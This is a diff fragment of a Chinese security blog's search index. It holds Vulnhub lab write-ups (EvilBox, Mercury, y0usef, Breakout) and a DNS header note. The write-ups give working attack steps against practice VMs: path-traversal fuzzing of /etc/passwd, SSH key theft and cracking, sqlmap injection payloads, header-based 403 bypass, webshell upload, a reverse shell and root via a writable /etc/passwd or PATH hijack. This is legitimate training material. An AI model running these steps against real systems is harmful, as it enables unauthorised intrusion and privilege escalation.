     <content><![CDATA[<h1 id="HackSudo"><a href="#HackSudo" class="headerlink" title="HackSudo"></a>HackSudo</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p><code>目标介绍</code> ：Debian Linux （目标是个网上在线银行系统）</p>
@@ -116,71 +328,6 @@
       </tags>
   </entry>
   <entry>
-    <title>EvilBox</title>
-    <url>/2021/11/06/evilbox/index/</url>
-    <content><![CDATA[<h1 id="Vulnhub-EvilBox靶机打靶过程"><a href="#Vulnhub-EvilBox靶机打靶过程" class="headerlink" title="Vulnhub EvilBox靶机打靶过程"></a>Vulnhub EvilBox靶机打靶过程</h1><h2 id="靶机详解"><a href="#靶机详解" class="headerlink" title="靶机详解"></a>靶机详解</h2><h3 id="1-难度"><a href="#1-难度" class="headerlink" title="1.难度"></a>1.难度</h3><p>中级</p>
-<h3 id="2-环境"><a href="#2-环境" class="headerlink" title="2.环境"></a>2.环境</h3><p>kali Linux 2021 192.168.0.104</p>
-<p>Linux Kernel 192.168.0.103</p>
-<h3 id="3-涉及技术"><a href="#3-涉及技术" class="headerlink" title="3.涉及技术"></a>3.涉及技术</h3><ul>
-<li>主机发现</li>
-<li>网络扫描</li>
-<li>强制访问</li>
-<li>参数爆破</li>
-<li>文件包含</li>
-<li>PHP封装器</li>
-<li>任意文件读取</li>
-<li>SSH公钥登录</li>
-<li>离线密码破解</li>
-<li>系统权限漏洞利用</li>
-</ul>
-<h2 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l </span><br></pre></td></tr></table></figure>
-
-<p>进行主机发现</p>
-<p>发现目标主机IP为192.168.0.103</p>
-<p>进行端口扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.0.103</span><br></pre></td></tr></table></figure>
-
-<p>发现目标主机打开的22，80端口，首先率先考虑80端口是否存在漏洞</p>
-<p>打开后发现如下，</p>
-<p>使用dirsearch 进行目录爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.0.103/ -w /home/yifang/fuzz/dirtop60000.txt -f</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071245544.png" alt="dirsearch1"></p>
-<p>发现目标存在 <code>secret</code>文件夹，打开后发现了一段字符 <code>hacker</code> ，继续使用<code>dirsearch</code> 进行目录爆破，发现了在<code>secret</code>下有一个<code>evil.php</code>的文件。此时的渗透工作似乎进入了瓶颈期，想到了可以对<code>evil.php</code>下的文件的get变量进行fuzz测试，于是使用<code>ffuf</code>工具对其进行测试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.0.103/secret/evil.php?FUZZ=../../../../../../../../etc/passwd -fs 0</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071245159.png" alt="ffuf"></p>
-<p>得出结果页面<code>command</code>参数存在命令包含漏洞，</p>
-<p>访问<code>/etc/passwd</code>发现存在<code>mowree</code>账户，</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071245103.png" alt="passwd"></p>
-<p>此时能反映到的是，对ssh进行密码爆破，但在爆破之前不妨尝试一下ssh登录看看debug信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071246184.png" alt="ssh"></p>
-<p>然后我就发现了，目标主机可以使用ssh免密登录，结合命令包含漏洞，直接读取他的公钥，岂不美哉？</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id_rsa : 生成的私钥文件</span><br><span class="line">id_rsa.pub ： 生成的公钥文件</span><br><span class="line">authorized_keys</span><br></pre></td></tr></table></figure>
-
-<p>读取mowree账户的authorized_keys文件，事实证明，我是可行的！</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071246368.png" alt="idrsa">但是问题也随之而来，需要一串密码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071246976.png" alt="parser"></p>
-<p>不过可以使用john进行离线密码破解，先使用john的插件将id_pub转换成可以被破解的样式，然后使用john进行破解<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071247249.png" alt="sshpass"></p>
-<p>得出密码为 <code>unicorn</code> 进行登录</p>
-<p>登录成功，然后使用find命令查找可以进行提权的文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2 &gt; /dev/null</span><br><span class="line">find / -perm /2000 2 &gt; /dev/null</span><br><span class="line">find / /writable 2 &gt; /dev/null </span><br><span class="line">存在/etc/passwd可以进行文件写入</span><br></pre></td></tr></table></figure>
-
-<p>使用，openssl生成一段密文</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 </span><br></pre></td></tr></table></figure>
-
-<p>然后替换/etc/passwd里面的x</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071247695.png" alt="getroot"></p>
-<p>提权成功，<u>打靶结束</u></p>
-]]></content>
-      <categories>
-        <category>Vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub-middlum</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hard-Socnet2</title>
     <url>/2021/11/06/hardsocnet2/index/</url>
     <content><![CDATA[<h1 id="Vulnhub靶机打靶-hard-socnet2"><a href="#Vulnhub靶机打靶-hard-socnet2" class="headerlink" title="Vulnhub靶机打靶-hard-socnet2"></a>Vulnhub靶机打靶-hard-socnet2</h1><h2 id="靶机详情"><a href="#靶机详情" class="headerlink" title="靶机详情"></a>靶机详情</h2><p>难度：高</p>
@@ -264,153 +411,6 @@
       </categories>
       <tags>
         <tag>Vulnhub-Hard</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TCP/IP协议包头</title>
-    <url>/2021/11/07/TCPIP/TCPIP/</url>
-    <content><![CDATA[<h1 id="TCP-IP包头"><a href="#TCP-IP包头" class="headerlink" title="TCP/IP包头"></a>TCP/IP包头</h1><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p><code>报文头</code> <code>问题|向服务器提出查询部分</code> <code>回答 | 服务器恢复的资源记录</code> <code>授权|权威的资源记录</code> <code>格外的|格外的资源记录</code></p>
-<p>除了报文头是固定的12字节外，其他每一部分的长度均为不定字节数，这边关心的是报文头、问题、回答这三个部分</p>
-<hr>
-<p>报文头</p>
-<p><code>ID</code> <code>QR|Opcode|AA|TC|RD|RA|Z|RCcode</code> <code>QDCPUNT</code> <code>ANCOUNT</code> <code>NSCOUNT</code> <code>ARCOUNT</code></p>
-<p><code>ID</code>:占16位，2个字节。此报文的编号，由客户端指定。DNS回复时带上此标识，以指示处理的对应请应请求。<br><code>QR</code>:占1位，1/8字节。0代表查询，1代表DNS回复<br><code>Opcode</code>:占4位，1/2字节。指示查询种类：0:标准查询；1:反向查询；2:服务器状态查询；3-15:未使用。<br><code>AA</code>:占1位，1/8字节。是否权威回复。<br><code>TC</code>:占1位，1/8字节。因为一个UDP报文为512字节，所以该位指示是否截掉超过的部分。<br><code>RD</code>:占1位，1/8字节。此位在查询中指定，回复时相同。设置为1指示服务器进行递归查询。<br><code>RA</code>:占1位，1/8字节。由DNS回复返回指定，说明DNS服务器是否支持递归查询。<br><code>Z</code>:占3位，3/8字节。保留字段，必须设置为0<br><code>RCODE</code>:占4位，1/2字节。由回复时指定的返回码：0:无差错；1:格式错；2:DNS出错；3:域名不存在；4:DNS不支持这类查询；5:DNS拒绝查询；6-15:保留字段。　<br><code>QDCOUNT</code>:占16位，2字节。一个无符号数指示查询记录的个数。<br><code>ANCOUNT</code>:占16位，2字节。一个无符号数指明回复记录的个数。<br><code>NSCOUNT</code>:占16位，2字节。一个无符号数指明权威记录的个数。<br><code>ARCOUNT</code>:占16位，2字节。一个无符号数指明格外记录的个数。</p>
-<hr>
-<p>问题部分</p>
-<p><code>QNMAE</code> <code>QTYPE</code> <code>Qclass</code></p>
-<p>QNAME:不定长，表示要查询的域名。<br>QTYPE:2字节，根据RFC1035及nslookup的帮助文档</p>
-<p>A=0x01, //指定计算机 IP 地址。<br>NS=0x02, //指定用于命名区域的 DNS 名称服务器。<br>MD=0x03, //指定邮件接收站（此类型已经过时了，使用MX代替）<br>MF=0x04, //指定邮件中转站（此类型已经过时了，使用MX代替）<br>CNAME=0x05, //指定用于别名的规范名称。<br>SOA=0x06, //指定用于 DNS 区域的“起始授权机构”。<br>MB=0x07, //指定邮箱域名。<br>MG=0x08, //指定邮件组成员。<br>MR=0x09, //指定邮件重命名域名。<br>NULL=0x0A, //指定空的资源记录<br>WKS=0x0B, //描述已知服务。<br>PTR=0x0C, //如果查询是 IP 地址，则指定计算机名；否则指定指向其它信息的指针。<br>HINFO=0x0D, //指定计算机 CPU 以及操作系统类型。<br>MINFO=0x0E, //指定邮箱或邮件列表信息。<br>MX=0x0F, //指定邮件交换器。<br>TXT=0x10, //指定文本信息。<br>AAAA=0x1c,//IPV6资源记录。<br>UINFO=0x64, //指定用户信息。<br>UID=0x65, //指定用户标识符。<br>GID=0x66, //指定组名的组标识符。<br>ANY=0xFF //指定所有数据类型。<br>QTYPE:2字节。 根据RFC1035及nslookup的帮助文档，我定义以下枚举类型：<br>enum QueryClass //指定信息的协议组。<br>IN=0x01, //指定 Internet 类别。<br>CSNET=0x02, //指定 CSNET 类别。（已过时）<br>CHAOS=0x03, //指定 Chaos 类别。<br>HESIOD=0x04,//指定 MIT Athena Hesiod 类别。<br>ANY=0xFF //指定任何以前列出的通配符。</p>
-<p>Qtype中 <code>A</code> <code>MX</code> <code>CNAME</code>,QCLASS中的<code>IN</code>为常用</p>
-<hr>
-<p>回答部分</p>
-<p><code>NAME</code> <code>TYPE</code> <code>CLASS</code> <code>TTL</code> <code>RDLENGTH</code> 　<code>ＲＤＡＴＡ</code></p>
-<p>NAME:回复查询的域名，不定长。<br>TYPE:回复的类型。2字节，与查询同义。指示RDATA中的资源记录类型。<br>CLASS:回复的类。2字节，与查询同义。指示RDATA中的资源记录类。<br>TTL:生存时间。4字节，指示RDATA中的资源记录在缓存的生存时间。<br>RDLENGTH:长度。2字节，指示RDATA块的长度。<br>RDATA:资源记录。不定义，依TYPE的不同，此记录的格示不同，通常一个MX记录是由一个2字节的指示该邮件交换器的优先级值及不定长的邮件交换器名组成的。</p>
-<h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><h2 id="FTP协议"><a href="#FTP协议" class="headerlink" title="FTP协议"></a>FTP协议</h2>]]></content>
-      <categories>
-        <category>TCP/IP</category>
-      </categories>
-      <tags>
-        <tag>TCP/IP数据包头</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mercury</title>
-    <url>/2021/11/07/Mercury/index/</url>
-    <content><![CDATA[<h1 id="Vulnhub-Mercury打靶"><a href="#Vulnhub-Mercury打靶" class="headerlink" title="Vulnhub Mercury打靶"></a>Vulnhub Mercury打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>星球系列靶机</p>
-<p>下载地址：<a href="https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td">https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td</a></p>
-<p>难度：Easy</p>
-<p>利用技术：</p>
-<p>​    setnv提权</p>
-<p>攻击主机：Kali Linux</p>
-<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p>首先进行信息，<code>arp-scan </code> <code>nmap</code>进行主机发现和端口扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">192.168.0.100	08:00:27:09:37:ea	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap -sV -p- -sC 192.168.0.100</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 02:20 EST</span><br><span class="line">Nmap scan report for 192.168.0.100</span><br><span class="line">Host is up (0.0045s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)</span><br><span class="line">|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)</span><br><span class="line">|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)</span><br><span class="line">8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2</span><br></pre></td></tr></table></figure>
-
-<p>目标打开了<code>22</code> <code>8080</code>端口</p>
-<h3 id="2-漏洞发现-amp-利用"><a href="#2-漏洞发现-amp-利用" class="headerlink" title="2.漏洞发现&amp;利用"></a>2.漏洞发现&amp;利用</h3><p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071532573.jpg"></p>
-<p>打开目标的<code>8080</code>端口，并没有发现任何有用的信息，包括审查页面的源码，以及<code>robots.txt</code>，都没有一点有价值的信息，尝试随便输入一个地址看一下，发现报错内容里面存在一个路径 <code>/mercuryfacts </code>，访问后发现了该页面</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071537948.png"></p>
-<p><code>id</code>这个关键字应该是很敏感了，更何况地址栏那么明显的伪静态，使用sqlmap进行注入，获得服务器密码</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─$ sqlmap -u http://192.168.0.100:8080/mercuryfacts/1* --dbs --batch</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: http://192.168.0.100:8080/mercuryfacts/1 AND 2334=2334</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: http://192.168.0.100:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x716a786271,(SELECT (ELT(3697=3697,1))),0x7170626a71),3697)</span><br></pre></td></tr></table></figure>
-
-<p>获得了服务器密码后，ssh进行登录</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071542316.png"></p>
-<p>获得了另一个操作系统账户，进行登录</p>
-<h3 id="3-提权-amp-amp-偷天换日"><a href="#3-提权-amp-amp-偷天换日" class="headerlink" title="3.提权&amp;&amp;偷天换日"></a>3.提权&amp;&amp;偷天换日</h3><p>/usr/bin/check_syslog.sh内容为</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">tail -n 10 /var/log/syslog</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071608660.png"></p>
-<p>复制<code>/bin/vim</code>命名为<code>/tmp/tail</code>，添加系统变量，使tail命令调用/tmp/tail文件，以root打开vim，在vim命令界面输入 <code>!/bin/bash</code> 提权成功 [这波直接偷天换日]</p>
-<p>打靶结束！！！</p>
-]]></content>
-      <categories>
-        <category>Vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub-Easy</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>y0usef打靶</title>
-    <url>/2021/11/21/Y0usef/y0usef%E6%89%93%E9%9D%B6/</url>
-    <content><![CDATA[<h1 id="y0usef打靶"><a href="#y0usef打靶" class="headerlink" title="y0usef打靶"></a>y0usef打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><h3 id="1-涉及技术"><a href="#1-涉及技术" class="headerlink" title="1.涉及技术"></a>1.涉及技术</h3><h4 id="1-弱口令漏洞"><a href="#1-弱口令漏洞" class="headerlink" title="1.弱口令漏洞"></a>1.弱口令漏洞</h4><h4 id="2-文件上传绕过"><a href="#2-文件上传绕过" class="headerlink" title="2.文件上传绕过"></a>2.文件上传绕过</h4><h4 id="3-Base64编码"><a href="#3-Base64编码" class="headerlink" title="3.Base64编码"></a>3.Base64编码</h4><h4 id="4-限制突破403"><a href="#4-限制突破403" class="headerlink" title="4.限制突破403"></a>4.限制突破403</h4><h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─$ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b3:6c:8c, IPv4: 192.168.0.103</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1	c0:a5:dd:ab:6d:1e	SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.20	60:ee:5c:c9:a5:d8	SHENZHEN FAST TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.0.100	08:00:27:a3:05:e3	PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
-
-<p>目标主机IP为192.168.0.100</p>
-<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ nmap -sC -p- -sV 192.168.0.100</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-20 20:57 EST</span><br><span class="line">Nmap scan report for 192.168.0.100</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 d8:e0:99:8c:76:f1:86:a3:ce:09:c8:19:a4:1d:c7:e1 (DSA)</span><br><span class="line">|   2048 82:b0:20:bc:04:ea:3f:c2:cf:73:c3:d4:fa:b5:4b:47 (RSA)</span><br><span class="line">|   256 03:4d:b0:70:4d:cf:5a:4a:87:c3:a5:ee:84:cc:aa:cc (ECDSA)</span><br><span class="line">|_  256 64:cd:d0:af:6e:0d:20:13:01:96:3b:8d:16:3a:d6:1b (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
-
-<p>目标22，80端口打开</p>
-<h3 id="3-403强制突破"><a href="#3-403强制突破" class="headerlink" title="3.403强制突破"></a>3.403强制突破</h3><p>这里说一下，一般403是权限不足导致的，对于403页面，有的服务器会对本地允许访问，导致可以突破403访问限制</p>
-<p>一般有以下几种方式进行限制突破（4种）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Http非标准报文</span><br><span class="line">1.url覆盖</span><br><span class="line">	X-Original-URL</span><br><span class="line">	X-Rewrite-URL</span><br><span class="line">2.参数覆盖</span><br><span class="line">	referer</span><br><span class="line">3. 本地访问</span><br><span class="line">	x-forwarded-for</span><br><span class="line">	x-Remote-IP:127.0.0.1</span><br><span class="line">	X-Originating-IP:</span><br><span class="line">	host旁站</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-URL覆盖"><a href="#1-URL覆盖" class="headerlink" title="1.URL覆盖"></a>1.URL覆盖</h4><p>包头如下，参数覆盖</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">X-Rewrite-URL</span><span class="punctuation">: </span>/adminstration</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=09a1smlqv9r1gsfr7h1f39kfb0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-Referer"><a href="#2-Referer" class="headerlink" title="2.Referer"></a>2.Referer</h4><p>有的页面只有通过某种特殊方式打开，使用<code>referer</code>进行尝试，实现</p>
-<h4 id="3-本地访问"><a href="#3-本地访问" class="headerlink" title="3.本地访问"></a>3.本地访问</h4><h5 id="1-XFF绕过-amp-XRI-amp-XOI"><a href="#1-XFF绕过-amp-XRI-amp-XOI" class="headerlink" title="1.XFF绕过&amp;XRI&amp;XOI"></a>1.XFF绕过&amp;XRI&amp;XOI</h5><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/adminstration/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=09a1smlqv9r1gsfr7h1f39kfb0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
-
-<h5 id="2-Host旁站"><a href="#2-Host旁站" class="headerlink" title="2.Host旁站"></a>2.Host旁站</h5><p>使用旁站，降低服务器警惕性，通过修改<code>Host</code>实现</p>
-<hr>
-<p>本次打靶通过<code>XFF</code>实现突破限制</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211034614.png"></p>
-<h3 id="4-漏洞发现"><a href="#4-漏洞发现" class="headerlink" title="4.漏洞发现"></a>4.漏洞发现</h3><p>使用弱口令进行登录 <code>admin&amp;admin</code>，成功访问，在登录后，进行寻找后台漏洞，发现有文件上传位置，进行上传绕过</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211035145.png"></p>
-<p>成功上传webshell！</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211029067.png"></p>
-<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>在目标主机的<code>/home</code>目录下发现了<code>user.txt</code>文件，使用cat命令打开</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211049005.png"></p>
-<p>使用ssh进行登录</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211053670.png"></p>
-<p>提权成功打靶结束</p>
-]]></content>
-      <categories>
-        <category>Vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub-Easy</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Breakout打靶</title>
-    <url>/2022/01/06/Breakout/Breakout%E6%89%93%E9%9D%B6/</url>
-    <content><![CDATA[<h1 id="Breakout打靶"><a href="#Breakout打靶" class="headerlink" title="Breakout打靶"></a>Breakout打靶</h1><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><p>名字：<code>Breakout</code></p>
-<p>使用技术：</p>
-<p><code>445端口发现用户名</code></p>
-<p><code>tar任意文件读取</code></p>
-<p><code>ook!加密解密</code></p>
-<p><code>服务器密码泄露</code></p>
-<hr>
-<p>攻击主机：<em>Kali Linux 2021 IP：192.168.0.103</em></p>
-<p>目标主机：<em>Debian 5.10 IP：192.168.0.105</em></p>
-<h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h3 id="1-目标发现"><a href="#1-目标发现" class="headerlink" title="1.目标发现"></a>1.目标发现</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.103</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.105	08:00:27:0a:ce:ae	PCS Systemtechnik GmbH（目标主机）</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ nmap -sC -sV -p- 192.168.0.105</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.51 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">10000/tcp open  http        MiniServ 1.981 (Webmin httpd)</span><br><span class="line">|_http-server-header: MiniServ/1.981</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line">20000/tcp open  http        MiniServ 1.830 (Webmin httpd)</span><br><span class="line">|_http-server-header: MiniServ/1.830</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>打开了80，139，445，10000，20000端口</p>
-<h3 id="3-目标提示信息"><a href="#3-目标提示信息" class="headerlink" title="3.目标提示信息"></a>3.目标提示信息</h3><p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061711782.png" alt="arp"></p>
-<p>奇奇怪怪的加密文件，百度大法后，得知是<code>ook!</code>加密</p>
-<p>获得了一串字符，猜测是操作系统密码，那账户呢？</p>
-<p>目标打开的445端口samba服务，使用工具进行扫描<code>enum4linux</code>结果发现目标系统有一个账户 <code>cyber</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061720472.png" alt="enum4linux"></p>
-<h3 id="4-成功登录并反弹shell"><a href="#4-成功登录并反弹shell" class="headerlink" title="4.成功登录并反弹shell"></a>4.成功登录并反弹shell</h3><p>目标开了20000端口，并启动了<code>Usermin</code>来管理服务器，使用账户密码登录 <code>cyber/(来点挑战性就不公布密码了)</code></p>
-<p>成功登录！！！</p>
-<p>寻找命令行管理工具 反弹shell，nc接收shell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061730415.jpg" alt="enum4linux"></p>
-<p>nc接受到shell </p>
-<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>发现隐藏文件 <code>.old_pass.bak</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061733296.jpg" alt="enum4linux"></p>
-<p>以及主目录下的tar文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061734943.jpg" alt="enum4linux"></p>
-<p>发现tar文件可以进行任意文件读取</p>
